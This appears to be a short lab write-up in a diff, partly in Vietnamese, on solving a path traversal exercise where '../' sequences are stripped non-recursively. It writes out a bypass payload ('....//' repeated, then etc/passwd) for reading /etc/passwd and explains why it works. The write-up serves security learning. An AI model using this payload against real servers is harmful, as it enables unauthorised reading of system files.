@@ -1,0 +1,19 @@
+Lab #3: File path traversal, traversal sequences stripped non-recursively
+
+End goal: Retrieve the contents of the /etc/passwd
+
+Analysis:
+
+filename = /etc/passwd
+--> 404 bad request
+
+filename = ../../../../etc/passwd
+--> 404 bad request
+--> dev vchặn "../"
+
+....//....//....//....//etc/passwd
+// được rút gọn thành / (nhiều dấu /// được coi là 1 dấu /)
+.... chứa ..
+parser tách lại thành ../
+
+--> Máy đọc: ../../../../etc/passwd
